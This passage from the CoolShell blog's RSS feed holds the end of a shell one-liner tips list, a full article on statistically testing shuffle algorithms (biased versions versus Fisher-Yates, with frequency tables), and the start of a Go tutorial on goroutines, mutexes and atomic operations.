<li><strong><code>wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com</code></strong><br />
下载整个www.example.com网站。（注：别太过分，大部分网站都有防爬功能了：））</li>
</ul>
<ul>
<li><strong><code>curl ifconfig.me</code></strong><br />
当你的机器在内网的时候，可以通过这个命令查看外网的IP。</li>
</ul>
<ul>
<li><strong><code>convert input.png -gravity NorthWest -background transparent -extent 720x200  output.png</code></strong><br />
改一下图片的大小尺寸</li>
</ul>
<ul>
<li><strong><code>lsof –i</code></strong><br />
实时查看本机网络服务的活动状态。</li>
</ul>
<ul>
<li><strong><code>vim scp://username@host//path/to/somefile</code></strong><br />
vim一个远程文件</li>
</ul>
<ul>
<li><strong><code>python -m SimpleHTTPServer</code></strong><br />
一句话实现一个HTTP服务，把当前目录设为HTTP服务目录，可以通过<code>http://localhost:8000</code>访问 这也许是这个星球上最简单的HTTP服务器的实现了。</li>
</ul>
<ul>
<li><strong><code>history | awk '{CMD[$2]++;count++;} END { for (a in CMD )print CMD[a] " " CMD[a]/count*100 "% " a }' | grep -v "./" | column -c3 -s " " -t | sort -nr | nl | head -n10</code></strong><br />
(陈皓注：有点复杂了，history|awk &#8216;{print $2}&#8217;|awk &#8216;BEGIN {FS=&#8221;|&#8221;} {print $1}&#8217;|sort|uniq -c|sort -rn|head -10)<br />
这行脚本能输出你最常用的十条命令，由此甚至可以洞察你是一个什么类型的程序员。</li>
</ul>
<ul>
<li>
<div title="Click to select this command">
<div><strong><code>tr -c "[:digit:]" " " &lt; /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"</code></strong><br />
想看看Marix的屏幕效果吗？（不是很像，但也很Cool!）</div>
</div>
</li>
</ul>
<p>看不懂行代码？没关系，系统的学习一下*nix shell脚本吧，力荐<a href="http://www.ituring.com.cn/book/980">《Linux命令行与Shell脚本编程大全》</a>。</p>
<h4>参考文献：</h4>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Unix_shell#Shell_categories">Unix Shell Wiki</a></li>
<li><a href="https://github.com">Github language ranking</a></li>
<li><a href="http://www.softpanorama.org/People/Shell_giants/introduction.shtml">An introduction of Unix Shell history</a></li>
<li><a href="http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html" target="_blank" rel="noopener">Tiobe Software</a></li>
<li><a href="http://www.commandlinefu.com/" target="_blank" rel="noopener">http://www.commandlinefu.com/</a></li>
</ul>
<p><!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/01/linux-bash-300x225-150x150.jpg" alt="应该知道的Linux技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_title">应该知道的Linux技巧</a></li><li ><a href="https://coolshell.cn/articles/9070.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/02/awk-150x150.jpg" alt="AWK 简明教程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9070.html" class="wp_rp_title">AWK 简明教程</a></li><li ><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png" alt="打造高效的工作环境 &#8211; Shell 篇" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 &#8211; Shell 篇</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg" alt="Linux PID 1 和 Systemd" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a></li><li ><a href="https://coolshell.cn/articles/12103.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/11/tux-fork-150x150.gif" alt="vfork 挂掉的一个问题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12103.html" class="wp_rp_title">vfork 挂掉的一个问题</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8619.html">你可能不知道的Shell</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8619.html/feed</wfw:commentRss>
			<slash:comments>149</slash:comments>
		
		
			</item>
		<item>
		<title>如何测试洗牌程序</title>
		<link>https://coolshell.cn/articles/8593.html</link>
					<comments>https://coolshell.cn/articles/8593.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Tue, 20 Nov 2012 00:22:07 +0000</pubDate>
				<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[编程语言]]></category>
		<category><![CDATA[Algorithm]]></category>
		<category><![CDATA[test]]></category>
		<category><![CDATA[Unit Test]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8593</guid>

					<description><![CDATA[<p>我希望本文有助于你了解测试软件是一件很重要也是一件不简单的事。 我们有一个程序，叫ShuffleArray()，是用来洗牌的，我见过N多千变万化的Shuffle...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8593.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8593.html">如何测试洗牌程序</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>我希望本文有助于你了解测试软件是一件很重要也是一件不简单的事。</p>
<p>我们有一个程序，叫ShuffleArray()，是用来洗牌的，我见过N多千变万化的ShuffleArray()，但是似乎从来没人去想过怎么去测试这个算法。所以，我在面试中我经常会问应聘者如何测试ShuffleArray()，没想到这个问题居然难倒了很多有多年编程经验的人。对于这类的问题，其实，测试程序可能比算法更难写，代码更多。而这个问题正好可以加强一下我在《<a title="我们需要专职的QA吗？" href="https://coolshell.cn/articles/6994.html" target="_blank">我们需要专职的QA吗？</a>》中我所推崇的——开发人员更适合做测试的观点。</p>
<p>我们先来看几个算法（<strong>第一个用递归二分随机抽牌，第二个比较偷机取巧，第三个比较通俗易懂</strong>）</p>
<h4>递归二分随机抽牌</h4>
<p>有一次是有一个朋友做了一个网页版的扑克游戏，他用到的算法就是想模拟平时我们玩牌时用手洗牌的方式，是用递归+二分法，我说这个程序恐怕不对吧。他觉得挺对的，说测试了没有问题。他的程序大致如下（原来的是用Javascript写的，我在这里凭记忆用C复现一下）：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
//递归二分方法
const size_t MAXLEN = 10;
const char TestArr[MAXLEN] = {&#039;A&#039;,&#039;B&#039;,&#039;C&#039;,&#039;D&#039;,&#039;E&#039;,&#039;F&#039;,&#039;G&#039;,&#039;H&#039;,&#039;I&#039;,&#039;J&#039;};

static char RecurArr[MAXLEN]={0};
static int cnt = 0;
void ShuffleArray_Recursive_Tmp(char* arr, int len)
{
    if(cnt &gt; MAXLEN || len &lt;=0){
        return;
    }

    int pos = rand() % len;
    RecurArr[cnt++] = arr[pos];
    if (len==1) return;
    ShuffleArray_Recursive_Tmp(arr, pos);
    ShuffleArray_Recursive_Tmp(arr+pos+1, len-pos-1);
}

void ShuffleArray_Recursive(char* arr, int len)
{
    memset(RecurArr, 0, sizeof(RecurArr));
    cnt=0;
    ShuffleArray_Recursive_Tmp(arr, len);
    memcpy(arr, RecurArr, len);
}

void main()
{
    char temp[MAXLEN]={0};
    for(int i=0; i&lt;5; i++) {
        strncpy(temp, TestArr, MAXLEN);
        ShuffleArray_Recursive((char*)temp, MAXLEN);
    }
}
</pre>
<p><span id="more-8593"></span></p>
<p>随便测试几次，还真像那么回事：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">第一次：D C A B H E G F I J
第二次：A G D B C E F J H I
第三次：A B H F C E D G I J
第四次：J I F B A D C E H G
第五次：F B A D C E H G I J</pre>
<h4>快排Hack法</h4>
<p>让我们再看一个hack 快排的洗牌程序（只看算法，省去别的代码）：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int compare( const void *a, const void *b )
{
    return rand()%3-1;
}

void ShuffleArray_Sort(char* arr, int len)
{
    qsort( (void *)arr, (size_t)len, sizeof(char), compare );
}
</pre>
<p>运行个几次，感觉得还像那么回事：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">第一次：H C D J F E A G B I
第二次：B F J D C E I H G A
第三次：C G D E J F B I A H
第四次：H C B J D F G E I A
第五次：D B C F E A I H G J</pre>
<p>看不出有什么破绽。</p>
<h4>大多数人的实现</h4>
<p>下面这个算法是大多数人的实现，就是for循环一次，然后随机交换两个数</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void ShuffleArray_General(char* arr, int len)
{
    const int suff_time = len;
    for(int idx=0; idx&lt;suff_time; idx++) {
        int i = rand() % len;
        int j = rand() % len;
        char temp = arr[i];
        arr[i] = arr[j];
        arr[j] = temp;
    }
}</pre>
<p>跑起来也还不错，洗得挺好的。</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">第一次：G F C D A J B I H E
第二次：D G J F E I A H C B
第三次：C J E F A D G B H I
第四次：H D C F A E B J I G
第五次：E A J F B I H G D C</pre>
<p>但是上述三个算法哪个的效果更好？好像都是对的。<strong>一般的QA或是程序员很有可能就这样把这个功能Pass了</strong>。但是事情并没有那么简单……</p>
<h4>如何测试</h4>
<p>在做测试之前，我们还需要了解一下一个基本知识——<strong>PC机上是做不出真随机数的，只能做出伪随机数。真随机数需要硬件支持</strong>。但是不是这样我们就无法测试了呢，不是的。我们依然可以测试。</p>
<p>我们知道，洗牌洗得好不好，主要是看是不是够随机。那么如何测试随机性呢？</p>
<p>试想，我们有个随机函数rand()返回1到10中的一个数，如果够随机的话，每个数返回的概率都应该是一样的，也就是说每个数都应该有10分之1的概率会被返回。</p>
<p>一到概率问题，我们只有一个方法来做测试，那就是用统计的方式。也就是说，你调用rand()函数100次，其中，每个数出现的次数大约都在10次左右。（注意：我用了左右，这说明概率并不是很准确的）不应该有一个数出现了15次以上，另一个在5次以下，要是这样的话，这个函数就是错的。</p>
<p>举一反三，测试洗牌程序也一样，需要通过概率的方式来做统计，是不是每张牌出现在第一个位置的次数都是差不多的。</p>
<p>于是，这样一来上面的程序就可以很容易做测试了。</p>
<p>下面是测试结果（<strong>测试样本1000次——列是每个位置出现的次数，行是各个字符的统计</strong>，出现概率应该是1/10，也就是100次）：</p>
<p><strong>递归随机抽牌的方法</strong></p>
<p>很明显，这个洗牌程序太有问题。算法是错的！</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">     1    2    3    4    5    6    7    8    9    10
----------------------------------------------------
A | 101  283  317  208   65   23    3    0    0    0
B | 101  191  273  239  127   54   12    2    1    0
C | 103  167  141  204  229  115   32    7    2    0
D | 103  103   87  128  242  195  112   26    3    1
E | 104   83   62   67  116  222  228   93   22    3
F |  91   58   34   60   69  141  234  241   65    7
G |  93   43   35   19   44  102  174  274  185   31
H |  94   28   27   27   46   68   94  173  310  133
I | 119   27   11   30   28   49   64   96  262  314
J |  91   17   13   18   34   31   47   88  150  511</pre>
<p><strong>快排Hack法</strong></p>
<p>看看对角线（从左上到右下）上的数据，很离谱！所以，这个算法也是错的。</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1    2    3    4    5    6    7    8    9    10
-----------------------------------------------------
A |   74  108  123  102   93  198   40   37   52  173
B |  261  170  114   70   49   28   37   76  116   79
C |  112  164  168  117   71   37   62   96  116   57
D |   93   91  119  221  103   66   91   98   78   40
E |   62   60   82   90  290  112   95   98   71   40
F |   46   60   63   76   81  318   56   42   70  188
G |   72   57   68   77   83   39  400  105   55   44
H |   99   79   70   73   87   34  124  317   78   39
I |  127  112  102   90   81   24   57   83  248   76
J |   54   99   91   84   62  144   38   48  116  264</pre>
<p><strong>大多数人的算法</strong></p>
<p>我们再来看看大多数人的算法。还是对角线上的数据有问题，所以，还是错的。</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1    2    3    4    5    6    7    8    9    10
-----------------------------------------------------
A |  178   98   92   82  101   85   79  105   87   93
B |   88  205   90   94   77   84   93   86  106   77
C |   93   99  185   96   83   87   98   88   82   89
D |  105   85   89  190   92   94  105   73   80   87
E |   97   74   85   88  204   91   80   90  100   91
F |   85   84   90   91   96  178   90   91  105   90
G |   81   84   84  104  102  105  197   75   79   89
H |   84   99  107   86   82   78   92  205   79   88
I |  102   72   88   94   87  103   94   92  187   81
J |   87  100   90   75   76   95   72   95   95  215</pre>
<h4>正确的算法</h4>
<p>下面，我们来看看性能高且正确的算法—— <a href="http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle" target="_blank">Fisher_Yates算法</a></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void ShuffleArray_Fisher_Yates(char* arr, int len)
{
    int i = len, j;
    char temp;

    if ( i == 0 ) return;
    while ( --i ) {
        j = rand() % (i+1);
        temp = arr[i];
        arr[i] = arr[j];
        arr[j] = temp;
    }
}</pre>
<p>这个算法不难理解，看看测试效果（效果明显比前面的要好）：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1    2    3    4    5    6    7    8    9    10
-----------------------------------------------------
A |  107   98   83  115   89  103  105   99   94  107
B |   91  106   90  102   88  100  102   97  112  112
C |  100  107   99  108  101   99   86   99  101  100
D |   96   85  108  101  117  103  102   96  108   84
E |  106   89  102   86   88  107  114  109  100   99
F |  109   96   87   94   98  102  109  101   92  102
G |   94   95  119  110   97  112   89  101   89   94
H |   93  102  102  103  100   89  107  105  101   98
I |   99  110  111  101  102   79  103   89  104  102
J |  105  112   99   99  108  106   95   95   99   82</pre>
<p>但是我们可以看到还是不完美。因为我们使用的rand()是伪随机数，不过已经很不错的。最大的误差在20%左右。</p>
<p>我们再来看看洗牌100万次的统计值，你会看到误差在6%以内了。这个对于伪随机数生成的程序已经很不错了。</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1       2     3       4      5      6      7      8     9      10
-------------------------------------------------------------------------
A | 100095  99939 100451  99647  99321 100189 100284  99565 100525  99984
B |  99659 100394  99699 100436  99989 100401  99502 100125 100082  99713
C |  99938  99978 100384 100413 100045  99866  99945 100025  99388 100018
D |  99972  99954  99751 100112 100503  99461  99932  99881 100223 100211
E | 100041 100086  99966  99441 100401  99958  99997 100159  99884 100067
F | 100491 100294 100164 100321  99902  99819  99449 100130  99623  99807
G |  99822  99636  99924 100172  99738 100567 100427  99871 100125  99718
H |  99445 100328  99720  99922 100075  99804 100127  99851 100526 100202
I | 100269 100001  99542  99835 100070  99894 100229 100181  99718 100261
J | 100268  99390 100399  99701  99956 100041 100108 100212  99906 100019</pre>
<h4>如何写测试案例</h4>
<p>测试程序其实很容易写了。就是，设置一个样本大小，做一下统计，然后计算一下误差值是否在可以容忍的范围内。比如：</p>
<ul>
<li>样本：100万次</li>
<li>最大误差：10%以内</li>
<li>平均误差：5%以内 （或者：90%以上的误差要小于5%）</li>
</ul>
<h4>注意</h4>
<p>其实，以上的测试只是测试了牌在各个位置的概率。这个还不足够好。因为还可能会现在有Patten的情况。如：每次洗牌出来的都是一个循环顺序数组。这完全可以满足我上面的测试条件。但是那明显是错的。<strong>所以，还需要统计每种排列的出现的次数</strong>，看看是不是均匀。但是，<strong>如果这些排列又是以某种规律出现的呢</strong>？看来，这没完没了了。</p>
<p>测试的确是一个很重要，并不简单的事情。谢谢所有参与讨论的人。</p>
<h4>附录</h4>
<p>之前忘贴了一个模拟我们玩牌洗牌的算法，现补充如下：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void ShuffleArray_Manual(char* arr, int len)
{
    int mid = len / 2;

    for (int n=0; n&lt;5; n++){

        //两手洗牌
        for (int i=1; i&lt;mid; i+=2){
            char tmp = arr[i];
            arr[i] = arr[mid+i];
            arr[mid+i] = tmp;
        }

        //随机切牌
        char *buf = (char*)malloc(sizeof(char)*len);

        for(int j=0; j&lt;5; j++) {
            int start= rand() % (len-1) + 1;
            int numCards= rand()% (len/2) + 1;

            if (start + numCards &gt; len ){
                numCards = len - start;
            }

            memset(buf, 0, len);
            strncpy(buf, arr, start);
            strncpy(arr, arr+start, numCards);
            strncpy(arr+numCards, buf, start);
        }
        free(buf);

    }
}</pre>
<p>我们来看看测试结果：（10万次）效果更好一些，误差在2%以内了。</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">      1       2     3       4      5      6      7      8     9      10
-------------------------------------------------------------------------
A |  10002   9998   9924  10006  10048  10200   9939   9812  10080   9991
B |   9939   9962  10118  10007   9974  10037  10149  10052   9761  10001
C |  10054  10100  10050   9961   9856   9996   9853  10016   9928  10186
D |   9851   9939   9852  10076  10208  10003   9974  10052   9992  10053
E |  10009   9915  10050  10037   9923  10094  10078  10059   9880   9955
F |  10151  10115  10113   9919   9844   9896   9891   9904  10225   9942
G |  10001  10116  10097  10030  10061   9993   9891   9922   9889  10000
H |  10075  10033   9866   9857  10170   9854  10062  10078  10056   9949
I |  10045   9864   9879  10066   9930   9919  10085  10104  10095  10013
J |   9873   9958  10051  10041   9986  10008  10078  10001  10094   9910</pre>
<p>（全文完）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/17381.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/07/PerfTest-150x150.png" alt="性能测试应该怎么做？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17381.html" class="wp_rp_title">性能测试应该怎么做？</a></li><li ><a href="https://coolshell.cn/articles/17225.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2015/08/cuckoo-150x150.jpg" alt="Cuckoo Filter：设计与实现" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17225.html" class="wp_rp_title">Cuckoo Filter：设计与实现</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/08/puzzle-150x150.png" alt="谜题的答案和活动的心得体会" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_title">谜题的答案和活动的心得体会</a></li><li ><a href="https://coolshell.cn/articles/11832.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/08/538efefbgw1eiz9cvx78fj20rm0fmdi8-150x150.jpg" alt="【活动】解迷题送礼物" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11832.html" class="wp_rp_title">【活动】解迷题送礼物</a></li><li ><a href="https://coolshell.cn/articles/10590.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/10/QR-Code-Overview-150x150.jpeg" alt="二维码的生成细节和原理" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10590.html" class="wp_rp_title">二维码的生成细节和原理</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8593.html">如何测试洗牌程序</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8593.html/feed</wfw:commentRss>
			<slash:comments>142</slash:comments>
		
		
			</item>
		<item>
		<title>Go 语言简介（下）— 特性</title>
		<link>https://coolshell.cn/articles/8489.html</link>
					<comments>https://coolshell.cn/articles/8489.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Wed, 07 Nov 2012 00:17:20 +0000</pubDate>
				<category><![CDATA[Go 语言]]></category>
		<category><![CDATA[程序设计]]></category>
		<category><![CDATA[编程语言]]></category>
		<category><![CDATA[Go]]></category>
		<category><![CDATA[golang]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8489</guid>

					<description><![CDATA[<p>希望你看到这篇文章的时候还是在公交车和地铁上正在上下班的时间，我希望我的这篇文章可以让你利用这段时间了解一门语言。当然，希望你不会因为看我的文章而错过站。呵呵。...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8489.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8489.html">Go 语言简介（下）— 特性</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>希望你看到这篇文章的时候还是在公交车和地铁上正在上下班的时间，我希望我的这篇文章可以让你利用这段时间了解一门语言。当然，希望你不会因为看我的文章而错过站。呵呵。</p>
<p>如果你还不了解Go语言的语法，还请你移步先看一下上篇——《<strong><a title="Go语言简介（上）：语法" href="https://coolshell.cn/articles/8460.html" target="_blank" rel="noopener noreferrer">Go语言简介（上）：语法</a></strong>》</p>
<p><img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2012/11/google-go-language.jpg" alt="" title="google-go-language" width="450" height="272" class="aligncenter size-full wp-image-8531" srcset="https://coolshell.cn/wp-content/uploads/2012/11/google-go-language.jpg 450w, https://coolshell.cn/wp-content/uploads/2012/11/google-go-language-300x181.jpg 300w, https://coolshell.cn/wp-content/uploads/2012/11/google-go-language-447x270.jpg 447w" sizes="(max-width: 450px) 100vw, 450px" /></p>
<h4>goroutine</h4>
<p>GoRoutine主要是使用go关键字来调用函数，你还可以使用匿名函数，如下所示：</p>
<p><span id="more-8489"></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="9,11">package main
import &quot;fmt&quot;

func f(msg string) {
    fmt.Println(msg)
}

func main(){
    go f(&quot;goroutine&quot;)

    go func(msg string) {
        fmt.Println(msg)
    }(&quot;going&quot;)
}</pre>
<p>我们再来看一个示例，下面的代码中包括很多内容，包括时间处理，随机数处理，还有goroutine的代码。如果你熟悉C语言，你应该会很容易理解下面的代码。</p>
<p>你可以简单的把go关键字调用的函数想像成pthread_create。下面的代码使用for循环创建了3个线程，每个线程使用一个随机的Sleep时间，然后在routine()函数中会输出一些线程执行的时间信息。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
package main

import &quot;fmt&quot;
import &quot;time&quot;
import &quot;math/rand&quot;

func routine(name string, delay time.Duration) {

    t0 := time.Now()
    fmt.Println(name, &quot; start at &quot;, t0)

    time.Sleep(delay)

    t1 := time.Now()
    fmt.Println(name, &quot; end at &quot;, t1)

    fmt.Println(name, &quot; lasted &quot;, t1.Sub(t0))
}

func main() {

    //生成随机种子
    rand.Seed(time.Now().Unix())

    var name string
    for i:=0; i&lt;3; i++{
        name = fmt.Sprintf(&quot;go_%02d&quot;, i) //生成ID
        //生成随机等待时间，从0-4秒
        go routine(name, time.Duration(rand.Intn(5)) * time.Second)
    }

    //让主进程停住，不然主进程退了，goroutine也就退了
    var input string
    fmt.Scanln(&amp;input)
    fmt.Println(&quot;done&quot;)
}
</pre>
<p>运行的结果可能是：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
go_00  start at  2012-11-04 19:46:35.8974894 +0800 +0800
go_01  start at  2012-11-04 19:46:35.8974894 +0800 +0800
go_02  start at  2012-11-04 19:46:35.8974894 +0800 +0800
go_01  end at  2012-11-04 19:46:36.8975894 +0800 +0800
go_01  lasted  1.0001s
go_02  end at  2012-11-04 19:46:38.8987895 +0800 +0800
go_02  lasted  3.0013001s
go_00  end at  2012-11-04 19:46:39.8978894 +0800 +0800
go_00  lasted  4.0004s
</pre>
<h4>goroutine的并发安全性</h4>
<p>关于goroutine，我试了一下，无论是Windows还是Linux，基本上来说是用操作系统的线程来实现的。不过，goroutine有个特性，也就是说，<strong>如果一个goroutine没有被阻塞，那么别的goroutine就不会得到执行</strong>。这并不是真正的并发，如果你要真正的并发，你需要在你的main函数的第一行加上下面的这段代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">import &quot;runtime&quot;
...
runtime.GOMAXPROCS(4)</pre>
<p>还是让我们来看一个有并发安全性问题的示例（注意：我使用了C的方式来写这段Go的程序）</p>
<p>这是一个经常出现在教科书里卖票的例子，我启了5个goroutine来卖票，卖票的函数sell_tickets很简单，就是随机的sleep一下，然后对全局变量total_tickets作减一操作。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
package main

import &quot;fmt&quot;
import &quot;time&quot;
import &quot;math/rand&quot;
import &quot;runtime&quot;

var total_tickets int32 = 10;

func sell_tickets(i int){
    for{
        if total_tickets &gt; 0 { //如果有票就卖
            time.Sleep( time.Duration(rand.Intn(5)) * time.Millisecond)
            total_tickets-- //卖一张票
            fmt.Println(&quot;id:&quot;, i, &quot;  ticket:&quot;, total_tickets)
        }else{
            break
        }
    }
}

func main() {
    runtime.GOMAXPROCS(4) //我的电脑是4核处理器，所以我设置了4
    rand.Seed(time.Now().Unix()) //生成随机种子

    for i := 0; i &lt; 5; i++ { //并发5个goroutine来卖票
         go sell_tickets(i)
    }
    //等待线程执行完
    var input string
    fmt.Scanln(&amp;input)
    fmt.Println(total_tickets, &quot;done&quot;) //退出时打印还有多少票
}</pre>
<p>这个程序毋庸置疑有并发安全性问题，所以执行起来你会看到下面的结果：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
$go run sell_tickets.go
id: 0   ticket: 9  
id: 0   ticket: 8  
id: 4   ticket: 7  
id: 1   ticket: 6  
id: 3   ticket: 5  
id: 0   ticket: 4  
id: 3   ticket: 3  
id: 2   ticket: 2  
id: 0   ticket: 1  
id: 3   ticket: 0  
id: 1   ticket: -1  
id: 4   ticket: -2  
id: 2   ticket: -3  
id: 0   ticket: -4  
-4 done</pre>
<p>可见，我们需要使用上锁，我们可以使用互斥量来解决这个问题。下面的代码，我只列出了修改过的内容：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="5,9,13,19"> package main
import &quot;fmt&quot;
import &quot;time&quot;
import &quot;math/rand&quot;
import &quot;sync&quot;
import &quot;runtime&quot;

var total_tickets int32 = 10;
var mutex = &amp;sync.Mutex{} //可简写成：var mutex sync.Mutex

func sell_tickets(i int){
    for total_tickets&gt;0 {
        mutex.Lock()
        if total_tickets &gt; 0 {
            time.Sleep( time.Duration(rand.Intn(5)) * time.Millisecond)
            total_tickets--
            fmt.Println(i, total_tickets)
        }
        mutex.Unlock()
    }
}
.......
......
</pre>
<h4>原子操作</h4>
<p>说到并发就需要说说原子操作，相信大家还记得我写的那篇《<a title="无锁队列的实现" href="https://coolshell.cn/articles/8239.html" target="_blank" rel="noopener noreferrer">无锁队列的实现</a>》一文，里面说到了一些CAS &#8211; CompareAndSwap的操作。Go语言也支持。你可以看一下相当的文档</p>
<p>我在这里就举一个很简单的示例：下面的程序有10个goroutine，每个会对cnt变量累加20次，所以，最后的cnt应该是200。如果没有atomic的原子操作，那么cnt将有可能得到一个小于200的数。</p>
<p>下面使用了atomic操作，所以是安全的。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="5,13,18">package main

import &quot;fmt&quot;
import &quot;time&quot;
import &quot;sync/atomic&quot;

func main() {
    var cnt uint32 = 0
    for i := 0; i &lt; 10; i++ {
        go func() {
            for i:=0; i&lt;20; i++ {
                time.Sleep(time.Millisecond)
                atomic.AddUint32(&amp;cnt, 1)
            }
        }()
    }
    time.Sleep(time.Second)//等一秒钟等goroutine完成
    cntFinal := atomic.LoadUint32(&amp;cnt)//取数据
    fmt.Println(&quot;cnt:&quot;, cntFinal)
}</pre>
<p>这样的函数还有很多，参看<a href="http://golang.org/pkg/sync/atomic/" target="_blank" rel="noopener noreferrer">go的atomic包文档</a>（被墙）</p>
<h4>Channel 信道</h4>
